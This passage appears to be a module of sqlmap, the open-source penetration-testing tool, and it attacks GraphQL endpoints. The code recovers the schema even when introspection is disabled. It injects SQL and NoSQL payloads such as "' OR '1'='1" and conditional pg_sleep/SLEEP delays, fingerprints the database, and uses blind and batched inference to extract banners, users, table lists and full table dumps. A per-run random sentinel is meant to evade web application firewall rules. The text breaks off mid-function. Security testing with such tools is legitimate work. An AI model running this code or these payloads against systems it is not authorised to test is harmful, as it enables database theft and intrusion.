#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import difflib
import json
import re
import time

from collections import namedtuple
from collections import OrderedDict

from lib.core.common import beep
from lib.core.common import randomStr
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import CUSTOM_LOGGING
from lib.core.enums import POST_HINT
from lib.core.settings import ERROR_PARSING_REGEXES
from lib.core.settings import GRAPHQL_ARG_WORDLIST
from lib.core.settings import GRAPHQL_ENDPOINT_PATHS
from lib.core.settings import GRAPHQL_ERROR_REGEX
from lib.core.settings import GRAPHQL_FIELD_WORDLIST
from lib.core.settings import GRAPHQL_INTROSPECTION_QUERY
from lib.core.settings import NOSQL_ERROR_REGEX
from lib.core.settings import UPPER_RATIO_BOUND
from lib.request.connect import Connect as Request
from lib.utils.xrange import xrange

# Improbable literal used to build always-true/never-match payloads. Randomized per run (like
# NOSQL_SENTINEL) so it never becomes a static signature a WAF can pin a blocking rule on.
SENTINEL = randomStr(length=10, lowercase=True)

# Maximum characters recovered for a single blind-inferred scalar (banner, user, table list, ...)
MAX_LENGTH = 1024

# Higher ceiling for a whole-table dump (its rows are concatenated into one scalar before extraction)
DUMP_MAX_LENGTH = 8192

# Printable-ASCII codepoint bounds for blind character inference
CHAR_MIN = 0x20
CHAR_MAX = 0x7e

# Number of independent predicates packed into a single aliased GraphQL document (batched inference)
BATCH_SIZE = 40

# Column/row separators woven into a GROUP_CONCAT/STRING_AGG table dump (printable, improbable in data)
COL_SEP = "~~~"
ROW_SEP = "^^^"

# GraphQL scalar types mapped to injection strategy (None = skip)
SCALAR_STRATEGY = {
    "String": "string",
    "ID": "id_dual",
    "Int": "numeric",
    "Float": "numeric",
}

# SQL error-inducing payloads (probe for backend DBMS leakage through the GraphQL errors envelope)
_SQL_ERROR_PAYLOADS = ("'", "''", "'\"", "')", "1') OR ('1'='1")

# Preliminary SQL boolean-blind probes
_SQL_BOOLEAN_TRUE = "' OR '1'='1"
_SQL_BOOLEAN_FALSE = "' AND '1'='2"

# NoSQL operator probes (for NoSQL-backed GraphQL resolvers)
_NOSQL_NE = '{"$ne": null}'
_NOSQL_IN = '{"$in": ["%s"]}' % SENTINEL

# Minimum content difference for a boolean oracle to be considered reliable
_MIN_RATIO_DIFF = 0.15

# Cache for INPUT_OBJECT field definitions, populated during schema walks
_inputFields = {}


# --- Backend SQL dialect table ----------------------------------------------

# Per-DBMS building blocks for blind inference and enumeration, driven by the boolean/time oracle
# established on a slot. `fingerprint` is a predicate true only on that back-end (it errors -> falsy
# elsewhere). `length`/`ordinal` render a scalar-extraction sub-expression. `delay` wraps a condition
# in an inline conditional sleep (None where the engine offers none, e.g. SQLite). `banner`/
# `currentUser`/`currentDb`/`tables` are generic enumeration scalars; `columns`/`rows` build the
# per-table column list and a single-scalar dump of every row (cells joined COL_SEP, rows ROW_SEP).
Dialect = namedtuple("Dialect", ("fingerprint", "length", "ordinal", "delay",
                                 "banner", "currentUser", "currentDb",
                                 "tables", "columns", "rows"))


def _sqliteRows(columns, table):
    cells = ["COALESCE(CAST(%s AS TEXT),'NULL')" % _ for _ in columns]
    body = ("||'%s'||" % COL_SEP).join(cells)
    return "(SELECT GROUP_CONCAT(%s,'%s') FROM %s)" % (body, ROW_SEP, table)


def _mysqlRows(columns, table):
    cells = ["COALESCE(CAST(%s AS CHAR),'NULL')" % _ for _ in columns]
    body = "CONCAT_WS('%s',%s)" % (COL_SEP, ",".join(cells))
    return "(SELECT GROUP_CONCAT(%s SEPARATOR '%s') FROM %s)" % (body, ROW_SEP, table)


def _pgsqlRows(columns, table):
    cells = ["COALESCE(CAST(%s AS TEXT),'NULL')" % _ for _ in columns]
    body = ("||'%s'||" % COL_SEP).join(cells)
    return "(SELECT STRING_AGG(%s,'%s') FROM %s)" % (body, ROW_SEP, table)


def _mssqlRows(columns, table):
    cells = ["COALESCE(CAST(%s AS VARCHAR(MAX)),'NULL')" % _ for _ in columns]
    body = ("+'%s'+" % COL_SEP).join(cells)
    return "(SELECT STRING_AGG(%s,'%s') FROM %s)" % (body, ROW_SEP, table)


DIALECTS = OrderedDict((
    ("SQLite", Dialect(
        fingerprint="SQLITE_VERSION() IS NOT NULL",
        length=lambda expr: "LENGTH((%s))" % expr,
        ordinal=lambda expr, pos: "UNICODE(SUBSTR((%s),%d,1))" % (expr, pos),
        delay=None,
        banner="SQLITE_VERSION()",
        currentUser=None,
        currentDb=None,
        tables="(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%')",
        columns=lambda table: "(SELECT GROUP_CONCAT(name) FROM pragma_table_info('%s'))" % table,
        rows=_sqliteRows)),
    ("Microsoft SQL Server", Dialect(
        fingerprint="@@VERSION LIKE '%Microsoft%'",
        length=lambda expr: "LEN((%s))" % expr,
        ordinal=lambda expr, pos: "ASCII(SUBSTRING((%s),%d,1))" % (expr, pos),
        delay=None,
        banner="@@VERSION",
        currentUser="SYSTEM_USER",
        currentDb="DB_NAME()",
        tables="(SELECT STRING_AGG(name,',') FROM sys.tables)",
        columns=lambda table: "(SELECT STRING_AGG(name,',') FROM sys.columns WHERE object_id=OBJECT_ID('%s'))" % table,
        rows=_mssqlRows)),
    ("PostgreSQL", Dialect(
        fingerprint="(SELECT version()) LIKE 'PostgreSQL%'",
        length=lambda expr: "LENGTH((%s))" % expr,
        ordinal=lambda expr, pos: "ASCII(SUBSTRING((%s),%d,1))" % (expr, pos),
        delay=lambda cond, secs: "(CASE WHEN (%s) THEN (SELECT 1 FROM pg_sleep(%d)) ELSE 0 END)" % (cond, secs),
        banner="version()",
        currentUser="CURRENT_USER",
        currentDb="CURRENT_DATABASE()",
        tables="(SELECT STRING_AGG(table_name,',') FROM information_schema.tables WHERE table_schema='public')",
        columns=lambda table: "(SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='%s')" % table,
        rows=_pgsqlRows)),
    ("MySQL", Dialect(
        fingerprint="@@VERSION_COMMENT IS NOT NULL",
        length=lambda expr: "CHAR_LENGTH((%s))" % expr,
        ordinal=lambda expr, pos: "ASCII(SUBSTRING((%s),%d,1))" % (expr, pos),
        delay=lambda cond, secs: "IF((%s),SLEEP(%d),0)" % (cond, secs),
        banner="VERSION()",
        currentUser="CURRENT_USER()",
        currentDb="DATABASE()",
        tables="(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())",
        columns=lambda table: "(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='%s')" % table,
        rows=_mysqlRows)),
))


# --- Slot model -------------------------------------------------------------

# Carries everything needed to build a valid GraphQL document for one argument
# injection point: the root operation (query/mutation), the full field argument
# list (so required siblings can be defaulted), the target argument name, the
# injection strategy, and return-type metadata for a correct selection set.
Slot = namedtuple("Slot", ("operation", "parentType", "fieldName", "allArgs",
                            "targetArg", "strategy", "returnKind", "returnType",
                            "returnSel"))


# --- Helpers ----------------------------------------------------------------

def _ratio(first, second):
    return difflib.SequenceMatcher(None, first or "", second or "").quick_ratio()


def _chunks(sequence, size):
    # Yield successive `size`-length chunks of `sequence`
    for index in xrange(0, len(sequence), size):
        yield sequence[index:index + size]


def _unwrapType(typeObj, depth=0):
    # Traverse a GraphQL type chain, returning [(kind, name), ...] from outermost
    # to innermost. NON_NULL and LIST wrappers are unwrapped transparently; named
    # types terminate the chain.
    if depth > 8 or not isinstance(typeObj, dict):
        return []
    kind = typeObj.get("kind", "")
    name = typeObj.get("name")
    ofType = typeObj.get("ofType")
    if ofType and kind in ("NON_NULL", "LIST"):
        return [(kind, name)] + _unwrapType(ofType, depth + 1)
    return [(kind, name)]


def _leafName(chain):
    # Last named type in the unwrapped chain (strips NON_NULL / LIST wrappers)
    for kind, name in reversed(chain):
        if name:
            return name
    return None


def _classifyArg(argType):
    # Map a GraphQL argument type to a strategy key, or None for skipped types
    chain = _unwrapType(argType)
    named = next((name for kind, name in reversed(chain) if name), None)
    return SCALAR_STRATEGY.get(named)


def _escapeGraphQLString(value):
    # Escape a string for embedding inside a double-quoted GraphQL string literal
    return getUnicode(value).replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n")


def _cell(value):
    # Render a parsed JSON value as a single dump cell: NULL for null, compact JSON
    # for nested objects/arrays (never the Python repr), and the plain text otherwise
    if value is None:
        return "NULL"
    if isinstance(value, (dict, list)):
        return json.dumps(value, sort_keys=True)
    return "%s" % (value,)


# --- HTTP transport ---------------------------------------------------------

def _gqlSend(endpoint, query, variables=None):
    # POST a JSON GraphQL request to `endpoint`, returning (body, http_code)
    body = {"query": query}
    if variables:
        body["variables"] = variables

    if conf.delay:
        time.sleep(conf.delay)

    if conf.verbose >= 3:
        logger.log(CUSTOM_LOGGING.PAYLOAD, query[:200])

    oldPostHint = getattr(kb, "postHint", None)
    try:
        kb.postHint = POST_HINT.JSON
        page, _, code = Request.getPage(url=endpoint, post=json.dumps(body),
                                        raise404=False, silent=True)
    except Exception:
        return "", 0
    finally:
        kb.postHint = oldPostHint
    return page or "", code


def _parseJSON(page):
    if not page:
        return None
    try:
        return json.loads(page)
    except (ValueError, TypeError):
        return None


def _isGraphQLResponse(page):
    # Does `page` look like a GraphQL JSON response envelope? Requires either
    # __typename data or GraphQL-specific error phrasing to avoid false positives
    # on ordinary JSON APIs.
    doc = _parseJSON(page)
    if not isinstance(doc, dict):
        return False
    data = doc.get("data")
    if isinstance(data, dict) and data.get("__typename"):
        return True
    errors = doc.get("errors")
    if isinstance(errors, list) and errors:
        return bool(re.search(GRAPHQL_ERROR_REGEX, json.dumps(errors)))
    return False


def _errorText(page):
    # Extract a concatenated error-message string from a GraphQL error envelope
    doc = _parseJSON(page)
    if not isinstance(doc, dict):
        return ""
    errors = doc.get("errors") or []
    parts = []
    for e in errors:
        if isinstance(e, dict):
            parts.append(getUnicode(e.get("message", "")))
            ext = e.get("extensions")
            if isinstance(ext, dict):
                parts.append(getUnicode(ext.get("code", "")))
                exception = ext.get("exception")
                if isinstance(exception, (str, bytes)):
                    parts.append(getUnicode(exception))
    return "\n".join(p for p in parts if p)


def _slotValue(page):
    # Extract the first `data` subtree for boolean comparison - we compare the
    # resolved field content, not the whole GraphQL envelope.
    doc = _parseJSON(page)
    if not isinstance(doc, dict):
        return page
    data = doc.get("data")
    if isinstance(data, dict):
        for v in data.values():
            if v is not None:
                return json.dumps(v, sort_keys=True)
    return json.dumps(data, sort_keys=True)


# --- Endpoint detection -----------------------------------------------------

def _detectEndpoint(baseUrl, probePaths=True):
    # Identify the GraphQL endpoint URL. If `baseUrl` already points at a path
    # that responds as GraphQL, return it directly. Otherwise probe common paths.

    page, code = _gqlSend(baseUrl, "{__typename}")
    if _isGraphQLResponse(page):
        return baseUrl, page

    if not probePaths:
        return None, None

    for path in GRAPHQL_ENDPOINT_PATHS:
        candidate = baseUrl.rstrip("/") + path
        page, code = _gqlSend(candidate, "{__typename}")
        if _isGraphQLResponse(page):
            return candidate, page

    return None, None


# --- Schema introspection ---------------------------------------------------

def _introspect(endpoint):
    # Send the standard introspection query and return the parsed __schema dict.
    # Falls back to a query without `specifiedByURL` for older GraphQL servers
    # that reject it.

    for query in (GRAPHQL_INTROSPECTION_QUERY,
                  GRAPHQL_INTROSPECTION_QUERY.replace('specifiedByURL\n', '')):
        page, code = _gqlSend(endpoint, query)
        doc = _parseJSON(page)
        if not isinstance(doc, dict):
            continue
        data = doc.get("data")
        if isinstance(data, dict) and "__schema" in data:
            return data["__schema"]
    return None


# --- Schema recovery via field suggestions (introspection disabled) ---------

def _gqlErrors(page):
    # GraphQL error-envelope messages as a list of strings
    doc = _parseJSON(page)
    if not isinstance(doc, dict):
        return []
    return [getUnicode(e.get("message", "")) for e in (doc.get("errors") or []) if isinstance(e, dict)]


def _harvestSuggestions(message):
    # Pull suggested identifiers out of a "Did you mean ..." GraphQL validation message,
    # handling both single- and double-quoted phrasings ('a', 'b', or 'c' / "a" or "b")
    idx = message.find("Did you mean")
    if idx < 0:
        return []
    return re.findall(r"""['"]([A-Za-z_][A-Za-z0-9_]*)['"]""", message[idx:])


def _suggestFields(endpoint, op):
    # Recover root field names for an operation via suggestion harvesting: probe a random
    # (guaranteed-unknown) field to collect the closest matches, then confirm/expand using a
    # seed wordlist. A seed that does NOT come back as "Cannot query field" is itself a real field.
    prefix = "" if op == "query" else "mutation "
    found = set()
    probes = [randomStr(length=10, lowercase=True)] + list(GRAPHQL_FIELD_WORDLIST)

    for seed in probes:
        page, _ = _gqlSend(endpoint, "%s{ %s }" % (prefix, seed))
        doc = _parseJSON(page) or {}
        for entry in (doc.get("errors") or []):
            message = getUnicode(entry.get("message", "")) if isinstance(entry, dict) else ""
            if "Did you mean" in message and "on type" in message:
                found.update(_harvestSuggestions(message))
        # a seeded name counts as a real field only if it actually resolved (appears in `data`);
        # "no unknown-field error" alone is too weak (lenient servers accept anything)
        data = doc.get("data")
        if seed in GRAPHQL_FIELD_WORDLIST and isinstance(data, dict) and seed in data:
            found.add(seed)

    return sorted(found)


def _suggestArgs(endpoint, op, field):
    # Recover an argument name for `field` from an "Unknown argument ... Did you mean ..." message
    prefix = "" if op == "query" else "mutation "
    bogus = randomStr(length=10, lowercase=True)
    page, _ = _gqlSend(endpoint, '%s{ %s(%s: 1) }' % (prefix, field, bogus))
    found = set()
    for message in _gqlErrors(page):
        if "Unknown argument" in message:
            found.update(_harvestSuggestions(message))
    return sorted(found)


def _introspectViaSuggestions(endpoint):
    # Fallback schema recovery when introspection is disabled but the server still leaks field/argument
    # names through "Did you mean" validation errors. Builds best-effort Slots: known scalar arg types
    # are unavailable here, so we default to the 'string' strategy (the most broadly injectable) and let
    # the per-slot injection oracle confirm which (field, argument) pairs are actually vulnerable.

    probe = randomStr(length=10, lowercase=True)
    page, _ = _gqlSend(endpoint, "{ %s }" % probe)
    if not any("Did you mean" in m for m in _gqlErrors(page)):
        return None

    logger.info("introspection is disabled; recovering the schema from field-suggestion errors")

    slots = []
    for op, parentName in (("query", "Query"), ("mutation", "Mutation")):
        fields = _suggestFields(endpoint, op)
        if not fields:
            continue
        logger.info("recovered %d %s field(s) via suggestions: %s" % (
            len(fields), op, ", ".join(fields)))
        for field in fields:
            args = _suggestArgs(endpoint, op, field) or list(GRAPHQL_ARG_WORDLIST)
            for arg in args:
                # returnSel="" renders as "{ __typename }" (valid on any OBJECT); strategy="string"
                slots.append(Slot(op, parentName, field, [(arg, {}, None)],
                                  arg, "string", "OBJECT", "", ""))
    return slots or None


# --- Schema walking ---------------------------------------------------------

def _extractSlots(schema):
    # Walk the schema's Query and Mutation types, harvesting every
    # scalar/injectable argument as a Slot

    _inputFields.clear()

    slots = []
    typeByName = {}
    for t in (schema.get("types") or []):
        if isinstance(t, dict) and t.get("name"):
            typeByName[t["name"]] = t
            if t.get("kind") == "INPUT_OBJECT":
                _inputFields[t["name"]] = [
                    (f["name"], f.get("type", {}), f.get("defaultValue"))
                    for f in (t.get("inputFields") or [])
                ]

    queryName = (schema.get("queryType") or {}).get("name")
    mutationName = (schema.get("mutationType") or {}).get("name")

    for op, rootName in (("query", queryName), ("mutation", mutationName)):
        if not rootName:
            continue
        rootType = typeByName.get(rootName)
        if not rootType or rootType.get("kind") != "OBJECT":
            continue
        for field in (rootType.get("fields") or []):
            fieldName = field["name"]
            fieldArgs = field.get("args") or []

            # Resolve return-type kind and the leaf selection set
            returnChain = _unwrapType(field.get("type", {}))
            returnKind = "SCALAR"
            returnTypeName = _leafName(returnChain)
            for kind, name in returnChain:
                if kind != "NON_NULL":
                    returnKind = kind

            returnObj = typeByName.get(returnTypeName) if returnTypeName else None
            leafFields = _scalarFields(returnObj, typeByName)

            # Nested object selections (one level)
            nested = {}
            if returnObj and returnObj.get("kind") == "OBJECT":
                for rf in (returnObj.get("fields") or []):
                    rfChain = _unwrapType(rf.get("type", {}))
                    rfName = _leafName(rfChain)
                    rfObj = typeByName.get(rfName) if rfName else None
                    if rfObj and rfObj.get("kind") == "OBJECT":
                        nested[rf["name"]] = _scalarFields(rfObj, typeByName) or ["__typename"]

            returnSel = _renderSelection(returnKind, returnTypeName, leafFields, nested)

            for arg in (fieldArgs or []):
                allArgs = [(a["name"], a.get("type", {}), a.get("defaultValue")) for a in fieldArgs]
                strategy = _classifyArg(arg.get("type", {}))
                if strategy:
                    slots.append(Slot(op, rootName, fieldName, allArgs,
                                      arg["name"], strategy, returnKind,
                                      returnTypeName, returnSel))
                elif _isInputObject(arg.get("type", {}), typeByName):
                    _inputSlots(op, rootName, fieldName, allArgs,
                                arg["name"], arg.get("type", {}),
                                returnKind, returnTypeName, returnSel, typeByName, slots)
    return slots


def _isInputObject(typeObj, typeByName):
    name = _leafName(_unwrapType(typeObj))
    if not name:
        return None
    t = typeByName.get(name)
    return t if t and t.get("kind") == "INPUT_OBJECT" else None


def _inputSlots(op, rootName, fieldName, allArgs, argName, typeObj,
                returnKind, returnType, returnSel, typeByName, slots):
    # Recurse one level into an input object's fields
    inputType = _isInputObject(typeObj, typeByName)
    if not inputType:
        return
    for fld in (inputType.get("inputFields") or []):
        strategy = _classifyArg(fld.get("type", {}))
        if strategy:
            slots.append(Slot(op, rootName, fieldName, allArgs,
                              "%s.%s" % (argName, fld["name"]), strategy,
                              returnKind, returnType, returnSel))


def _scalarFields(objType, typeByName, depth=0):
    # Return scalar/leaf field names reachable from `objType` (for selection set)
    if not objType or depth > 3:
        return []
    names = []
    for fld in (objType.get("fields") or []):
        fType = typeByName.get(_leafName(_unwrapType(fld.get("type", {}))))
        if not fType or fType.get("kind") in ("SCALAR", "ENUM"):
            names.append(fld["name"])
    return names


def _renderSelection(returnKind, returnType, leafFields, nested):
    # Build the return selection part of a GraphQL document string.
    # Scalars/enums: no sub-selection (None). Objects/Lists-of-objects:
    # nested field set. Lists-of-scalars also get no sub-selection.
    if returnKind in ("SCALAR", "ENUM"):
        return None
    leafPart = " ".join(leafFields) if leafFields else "__typename"
    nestedPart = ""
    for objField, subFields in (nested or {}).items():
        nestedPart += " %s { %s }" % (objField, " ".join(subFields))
    return "{ %s%s }" % (leafPart, nestedPart)


# --- Request construction ---------------------------------------------------

def _fieldFragment(slot, value, alias=None):
    # Render a single `alias:field(args) selection` fragment with `value` in the
    # target argument. Required sibling arguments get safe defaults. Returns "" when
    # the value cannot be embedded (e.g. a non-numeric payload in an Int literal).

    if slot.strategy == "numeric" and not getUnicode(value).lstrip("-").isdigit():
        return ""

    renderedArgs = []
    for argName, argType, default in slot.allArgs:
        if argName == slot.targetArg or slot.targetArg.startswith(argName + "."):
            if "." in slot.targetArg:
                outer, inner = slot.targetArg.split(".", 1)
                if argName == outer:
                    renderedArgs.append("%s: {%s}" % (outer, _renderInputObj(slot, value)))
                    continue
            renderedArgs.append(_renderArg(argName, value, slot.strategy))
        else:
            siblingStrategy = _classifyArg(argType) or "string"
            renderedArgs.append(_renderArg(argName, _defaultForArg(argType, default), siblingStrategy))

    sel = slot.returnSel
    if sel is None:
        sel = ""
    elif not sel:
        sel = "{ __typename }"
    argsPart = "(%s)" % ", ".join(renderedArgs) if renderedArgs else ""
    return "%s:%s%s %s" % (alias or slot.fieldName, slot.fieldName, argsPart, sel)


def _buildQuery(slot, value):
    # Render a complete single-field GraphQL document with `value` in the target
    # argument. Wraps as a mutation when the slot belongs to the mutation root.
    fragment = _fieldFragment(slot, value)
    if not fragment:
        return ""
    prefix = "mutation " if slot.operation == "mutation" else ""
    return "%s{%s}" % (prefix, fragment)


def _buildBatch(slot, values):
    # Render one GraphQL document aliasing the field once per value (a0, a1, ...),
    # so many independent injections resolve in a single request. Returns
    # (document, aliases) or ("", []) when any value cannot be embedded.
    fragments, aliases = [], []
    for index, value in enumerate(values):
        alias = "a%d" % index
        fragment = _fieldFragment(slot, value, alias)
        if not fragment:
            return "", []
        fragments.append(fragment)
        aliases.append(alias)
    prefix = "mutation " if slot.operation == "mutation" else ""
    return "%s{%s}" % (prefix, " ".join(fragments)), aliases


def _renderArg(name, value, strategy):
    # Render a single argument: name:"value" (string) or name:value (numeric)
    if strategy == "numeric":
        return "%s:%s" % (name, value)
    if strategy == "id_dual" and isinstance(value, (str, bytes)) and getUnicode(value).lstrip("-").isdigit():
        return "%s:%s" % (name, value)
    return '%s:"%s"' % (name, _escapeGraphQLString(value))


def _renderInputObj(slot, value):
    # Render an input-object literal with the target inner field set to `value`
    # and all required sibling fields filled with safe defaults
    _, inner = slot.targetArg.split(".", 1)

    outerArg = slot.targetArg.split(".")[0]
    inputFields = []
    for aName, aType, aDefault in slot.allArgs:
        if aName == outerArg:
            objName = _leafName(_unwrapType(aType))
            if objName:
                inputFields = _inputFields.get(objName, [])
            break

    parts = []
    for fldName, fldType, fldDefault in inputFields:
        if fldName == inner:
            fldStrategy = _classifyArg(fldType) or "string"
            parts.append(_renderArg(inner, value, fldStrategy))
        else:
            fldStrategy = _classifyArg(fldType) or "string"
            parts.append(_renderArg(fldName, _defaultForArg(fldType, fldDefault), fldStrategy))
    return ", ".join(parts)


def _defaultForArg(argType, default):
    # Return a safe GraphQL default value for a field argument: the schema
    # default if present, otherwise a type-appropriate sentinel
    if default is not None:
        return default
    strategy = _classifyArg(argType)
    if strategy == "numeric":
        return 0
    return "x"


# --- Detection --------------------------------------------------------------

def _detectError(slot, endpoint):
    # Error-based detection: inject SQL/NoSQL error-inducing payloads and check
    # whether the GraphQL `errors` envelope carries a known DBMS signature

    for payload in _SQL_ERROR_PAYLOADS:
        query = _buildQuery(slot, payload)
        if not query:
            continue
        page, code = _gqlSend(endpoint, query)
        err = _errorText(page)
        if not err:
            continue
        for pattern in ERROR_PARSING_REGEXES:
            m = re.search(pattern, err)
            if m:
                return "error-based", m.group("result") if "result" in m.groupdict() else err[:200]

    # Try NoSQL error signatures
    for payload in (_NOSQL_NE, _NOSQL_IN):
        query = _buildQuery(slot, payload)
        if not query:
            continue
        page, code = _gqlSend(endpoint, query)
        err = _errorText(page)
        if err and re.search(NOSQL_ERROR_REGEX, err):
            return "error-based", err[:200]

    return None, None


def _detectBoolean(slot, endpoint):
    # Boolean-based detection: compare the resolved data between true and false
    # payloads. Numeric GraphQL literals (Int/Float) cannot carry SQL payloads.

    if slot.strategy == "numeric":
        return None, None

    trueQuery = _buildQuery(slot, _SQL_BOOLEAN_TRUE)
    falseQuery = _buildQuery(slot, _SQL_BOOLEAN_FALSE)

    if not trueQuery or not falseQuery:
        return None, None

    truePage, _ = _gqlSend(endpoint, trueQuery)
    falsePage, _ = _gqlSend(endpoint, falseQuery)

    trueVal = _slotValue(truePage)
    falseVal = _slotValue(falsePage)

    if _ratio(trueVal, falseVal) < (1.0 - _MIN_RATIO_DIFF):
        return "boolean-based blind (string)", truePage

    return None, None


def _detectTime(slot, endpoint):
    # Time-based detection: send a per-dialect conditional sleep and measure the
    # elapsed time against a baseline. Returns (oracleType, threshold, dbms).

    if slot.strategy == "numeric":
        return None, None, None

    baseQuery = _buildQuery(slot, "x")
    if not baseQuery:
        return None, None, None

    start = time.time()
    _gqlSend(endpoint, baseQuery)
    baseline = time.time() - start

    delay = conf.timeSec
    for dbms, dialect in DIALECTS.items():
        if not dialect.delay:
            continue
        query = _buildQuery(slot, "%s' OR %s-- " % (SENTINEL, dialect.delay("1=1", delay)))
        if not query:
            continue
        start = time.time()
        _gqlSend(endpoint, query)
        if (time.time() - start) > baseline + delay * 0.5:
            return "time-based blind", baseline + delay * 0.5, dbms

    return None, None, None


# --- Boolean / time oracle (universal blind-SQLi primitive) -----------------

def _makeOracle(slot, endpoint, dbmsHint=None, threshold=None):
    """Establish a truth(sqlCondition) -> bool primitive on `slot`. For a content
    oracle the condition is injected as `<sentinel>' OR (<cond>)-- ` and the resolved
    field is compared to its always-true template; for a timing oracle the condition
    is wrapped in the dialect's conditional sleep. Returns (truth, truthBatch) where
    truthBatch(conditions) -> [bool] evaluates many conditions in one aliased request
    (None when the back-end rejects batching). Returns (None, None) when no usable
    contrast exists on this slot."""

    def _payload(condition):
        return "%s' OR (%s)-- " % (SENTINEL, condition)

    if threshold is not None and dbmsHint and DIALECTS[dbmsHint].delay:
        # Timing oracle: a per-document sleep fires only when `condition` holds. Batching
        # would serialise the sleeps and inflate every request, so it is not offered here.
        delay = DIALECTS[dbmsHint].delay

        def truth(condition):
            query = _buildQuery(slot, "%s' OR %s-- " % (SENTINEL, delay(condition, conf.timeSec)))
            if not query:
                return False
            start = time.time()
            _gqlSend(endpoint, query)
            return (time.time() - start) > threshold

        return truth, None

    # Content oracle: capture the always-true template and require a clear true/false split
    trueVal = _slotValue(_gqlSend(endpoint, _buildQuery(slot, _payload("1=1")))[0])
    falseVal = _slotValue(_gqlSend(endpoint, _buildQuery(slot, _payload("1=2")))[0])
    if _ratio(trueVal, falseVal) > UPPER_RATIO_BOUND:
        return None, None

    def truth(condition):
        query = _buildQuery(slot, _payload(condition))
        if not query:
            return False
        page, _ = _gqlSend(endpoint, query)
        return _ratio(_slotValue(page), trueVal) > UPPER_RATIO_BOUND

    def truthBatch(conditions):
        query, aliases = _buildBatch(slot, [_payload(_) for _ in conditions])
        if not query:
            return [False] * len(conditions)
        page, _ = _gqlSend(endpoint, query)
        data = (_parseJSON(page) or {}).get("data") or {}
        return [_ratio(json.dumps(data.get(alias), sort_keys=True, default=str), trueVal) > UPPER_RATIO_BOUND
                for alias in aliases]

    # Sanity: the oracle must answer a known truth/falsehood correctly
    if not (truth("1=1") and not truth("1=2")):
        return None, None

    return truth, truthBatch


def _fingerprint(truth):
    # Identify the back-end DBMS by probing each dialect's signature predicate
    for dbms, dialect in DIALECTS.items():
        if truth(dialect.fingerprint):
            return dbms
    return None


# --- Blind inference --------------------------------------------------------

def _inferExpr(truth, dialect, expr, maxLen=MAX_LENGTH):
    # Recover the string value of SQL expression `expr` one character at a time:
    # binary-search the length, then bisect each character's codepoint over the
    # printable-ASCII range (~log2(95) requests per character).
    lengthExpr = dialect.length(expr)

    if not truth("%s>0" % lengthExpr):
        return "" if truth("%s=0" % lengthExpr) else None

    length, probe = 1, 2
    while probe <= maxLen and truth("%s>=%d" % (lengthExpr, probe)):
        length, probe = probe, probe * 2
    low, high = length, min(probe, maxLen + 1)
    while low + 1 < high:
        mid = (low + high) // 2
        if truth("%s>=%d" % (lengthExpr, mid)):
            low = mid
        else:
            high = mid
    length = low

    value = ""
    for pos in xrange(1, length + 1):
        ordExpr = dialect.ordinal(expr, pos)
        if not truth("%s>=%d" % (ordExpr, CHAR_MIN)):
            value += "?"           # codepoint outside the printable-ASCII range
            continue
        low, high = CHAR_MIN, CHAR_MAX
        while low < high:
            mid = (low + high + 1) // 2
            if truth("%s>=%d" % (ordExpr, mid)):
                low = mid
            else:
                high = mid - 1
        value += chr(low)
    return value


def _inferExprBatched(truthBatch, dialect, expr, maxLen=MAX_LENGTH):
    # Same recovery as _inferExpr, but every probe is independent and resolved in
    # parallel via aliased batching: the length is read from monotone >=N predicates
    # and each character from its 7 independent bit predicates (ASCII & 2**b). An
    # L-character value costs ceil(7*L / BATCH_SIZE) requests instead of ~7*L.
    lengthExpr = dialect.length(expr)

    length = 0
    for chunk in _chunks(list(xrange(1, maxLen + 1)), BATCH_SIZE):
        results = truthBatch(["%s>=%d" % (lengthExpr, _) for _ in chunk])
        hits = [n for n, ok in zip(chunk, results) if ok]
        if hits:
            length = max(length, max(hits))
        if not all(results):       # monotone predicate: no longer length can be true beyond here
            break
    if length == 0:
        return ""

    conditions, index = [], []
    for pos in xrange(1, length + 1):
        for bit in xrange(7):
            conditions.append("(%s & %d)>0" % (dialect.ordinal(expr, pos), 1 << bit))
            index.append((pos, bit))

    codes = {}
    flat = []
    for chunk in _chunks(conditions, BATCH_SIZE):
        flat.extend(truthBatch(chunk))
    for (pos, bit), ok in zip(index, flat):
        if ok:
            codes[pos] = codes.get(pos, 0) | (1 << bit)

    value = ""
    for pos in xrange(1, length + 1):
        code = codes.get(pos, 0)
        value += chr(code) if CHAR_MIN <= code <= CHAR_MAX else "?"
    return value


def _inferrer(truth, truthBatch, dialect):
    # Pick batched inference when the back-end honours aliased batching (verified
    # with a known true/false pair), else fall back to sequential bisection
    if truthBatch and truthBatch(["1=1", "1=2"]) == [True, False]:
        logger.info("using aliased query batching to accelerate blind extraction")
        return lambda expr, maxLen=MAX_LENGTH: _inferExprBatched(truthBatch, dialect, expr, maxLen)
    return lambda expr, maxLen=MAX_LENGTH: _inferExpr(truth, dialect, expr, maxLen)


def _dumpTable(infer, dialect, table):
    # Enumerate a table's columns, then recover every row as one concatenated scalar
    # and split it back into a (columns, rows) grid
    columnsRaw = infer(dialect.columns(table))
    columns = [_ for _ in (columnsRaw or "").split(",") if _]
    if not columns:
        return None

    raw = infer(dialect.rows(columns, table), DUMP_MAX_LENGTH)
    rows = []
    for record in (raw or "").split(ROW_SEP) if raw else []:
        cells = record.split(COL_SEP)
        rows.append((cells + [""] * len(columns))[:len(columns)])
    return columns, rows


# --- Dump -------------------------------------------------------------------

def _dumpInband(endpoint, slot, templatePage):
    # Check whether the always-true response carries materially more data than
    # the original (in-band data exposure)
    origQuery = _buildQuery(slot, "x")
    if not origQuery:
        return None
    origPage, _ = _gqlSend(endpoint, origQuery)
    if len(templatePage or "") < len(origPage or "") * 1.25:
        return None
    return _parseRows(templatePage, slot)


def _parseRows(page, slot):
    # Parse a GraphQL JSON `data` tree into (columns, rows)
    doc = _parseJSON(page)
    if not isinstance(doc, dict):
        return None
    data = doc.get("data")
    if not isinstance(data, dict):
        return None
    for v in data.values():
        if v is None:
            return None
        if isinstance(v, list):
            columns = []
            for item in v:
                if isinstance(item, dict):
                    for k in item:
                        if k not in columns:
                            columns.append(k)
            rows = []
